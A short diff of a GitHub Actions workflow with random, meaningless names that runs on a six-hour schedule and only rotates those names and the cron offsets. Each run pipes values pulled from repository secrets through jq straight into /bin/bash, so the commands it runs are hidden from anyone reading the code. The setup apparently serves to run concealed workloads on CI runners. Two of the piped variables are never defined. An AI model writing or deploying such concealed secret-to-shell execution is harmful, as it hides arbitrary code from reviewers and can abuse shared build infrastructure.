@@ -1,10 +1,8 @@
 name: liangjiajiang9129
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
-
+    - cron: '37 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +10,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: liangjiajiang9129
         env:
-          bxu43110: ${{ secrets.bxu43110 }}
+          zk46: ${{ secrets.zk46 }}
         run: |
-          echo $bxu43110 | jq -r .mlu3942 | /bin/bash
-          echo $eiigk52 | jq -r .ppjd47 | /bin/bash
-          echo $y4 | jq -r .v271 | /bin/bash
+          echo $zk46 | jq -r .xbapi86954 | /bin/bash
+          echo $nvvh20 | jq -r .nbvuv75875 | /bin/bash
+          echo $co660 | jq -r .rax6 | /bin/bash
 
